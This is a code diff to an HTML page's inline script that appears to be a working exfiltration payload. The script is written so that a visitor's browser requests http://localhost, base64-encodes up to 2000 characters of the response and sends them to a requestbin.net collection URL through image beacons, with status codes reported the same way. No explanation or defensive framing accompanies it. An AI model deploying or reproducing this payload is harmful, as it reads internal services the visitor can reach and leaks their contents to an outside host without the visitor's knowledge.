@@ -6,17 +6,27 @@
   </head>
   <body>
     <script>
+    let LOG_URL = "http://requestbin.net/r/380yyurc";
     let img = new Image();
-    img.src = "http://requestbin.net/r/6kwyjjhz?QERTY";
-      
-    /*let req = new XMLHttpRequest();
+    img.src = LOG_URL + "?START";
+
+    let req = new XMLHttpRequest();
     req.open('GET', "http://localhost", false);
+    //req.withCredentials = true;
+    req.onreadystatechange = function (aEvt)
+    {
+      if (req.readyState == 4)
+      {
+         if (req.status == 200)
+          img.src = LOG_URL + "?CODE=200";
+         else
+          img.src = LOG_URL + "?CODE="+req.status;
+      }
+    };
     req.send();
-    let img = new Image();
-    if (req.responseText != "")
-      img.src = "http://requestbin.net/r/a7clyt9h?"+btoa(req.responseText.substring(1, 100));
-     else 
-       img.src = "http://requestbin.net/r/a7clyt9h?QERTY";*/
+
+    img = new Image();
+    img.src = LOG_URL + "?"+btoa(req.responseText.substring(1,2000));
 
     </script>
   </body>
